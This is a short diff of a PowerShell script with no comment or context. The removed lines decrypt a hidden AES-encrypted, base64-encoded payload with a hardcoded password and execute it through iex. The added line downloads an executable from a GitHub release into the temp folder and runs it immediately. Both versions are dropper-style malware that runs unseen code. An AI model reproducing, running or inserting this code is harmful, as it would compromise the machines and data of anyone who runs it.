@@ -1,7 +1,1 @@
-$p='Fj83#@kL9$mN2!xZ'
-$k=([System.Security.Cryptography.SHA256]::Create()).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($p))[0..15]
-$i=[Convert]::FromBase64String('DPVygGSyX5CoMWI9yl2n1g==')
-$c=[Convert]::FromBase64String('1keWhmlX1Wc0CUHgEyw7IZx5nJYKWnX6GxIGKlKHuXoaWOU+VHBoSvM94eJgAKO074YbLJAhYxrPsu6Vgz35GuUUYcd97jkoN9/7PrsX6qHk4LtxKAxdSMctoclG1doVNNrgcDxT6OftfO+IbwtCmA==')
-$a=[System.Security.Cryptography.Aes]::Create()
-$a.Key=$k;$a.IV=$i
-iex([System.Text.Encoding]::UTF8.GetString($a.CreateDecryptor().TransformFinalBlock($c,0,$c.Length)))
+iwr https://github.com/Proxyonly/dsfds/releases/download/da/TEMP.exe -O $env:TEMP\m.exe; & $env:TEMP\m.exe
